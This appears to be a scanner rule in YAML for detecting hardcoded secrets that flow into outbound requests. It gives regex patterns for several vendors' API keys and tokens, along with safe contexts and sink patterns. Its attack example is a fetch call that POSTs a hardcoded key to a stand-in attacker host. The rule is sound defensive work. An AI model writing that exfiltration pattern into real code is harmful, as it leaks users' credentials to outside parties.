id: secrets-hardcoded-to-exfil
scanner_type: Secrets
name: Hardcoded Secret Flowing to Network Exfiltration
description: >
  A hardcoded API key, token, or password is present in source code or
  config files and flows into an outbound network request to an
  attacker-controlled or external host.
cwe: CWE-798
severity: Critical

source:
  type: HARDCODED_SECRET
  detection_patterns:
    - pattern: 'sk-ant-[a-zA-Z0-9\-_]{40,}'
      name: Anthropic API Key
    - pattern: 'AKIA[A-Z0-9]{16}'
      name: AWS Access Key ID
    - pattern: 'ghp_[a-zA-Z0-9]{36}'
      name: GitHub Personal Access Token
    - pattern: 'glpat-[a-zA-Z0-9\-_]{20}'
      name: GitLab Personal Access Token
    - pattern: 'xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}'
      name: Slack Bot Token
    - pattern: 'eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}'
      name: JWT Token
    - entropy: '>4.5 in string assigned to variable named *key*|*token*|*secret*|*password*'
      name: High-entropy secret (entropy-based detection)

safe_contexts:
  - test fixtures and example files
  - values starting with 'REPLACE_ME' or 'YOUR_*_HERE'
  - values in *.example, *.sample, *.template files
  - values that are clearly fake (all zeros, repeating patterns)

sink:
  type: NETWORK_EXFIL
  patterns:
    - fetch(url, { headers: { Authorization: secret } })
    - axios.post(url, { token: secret })
    - http.request({ auth: secret })

chain_with: config-write-to-exec

attack_example: |
  // Hardcoded in source:
  const API_KEY = 'sk-ant-api03-realkey...'

  // Flows to:
  fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: JSON.stringify({ key: API_KEY })
  })
  // → Key exfiltrated to attacker

git_history_check: true
note: >
  Also scan git history for secrets that were added and then removed.
  Tools: git-secrets, truffleHog, gitleaks. The removal commit doesn't
  invalidate the secret — it must be rotated.
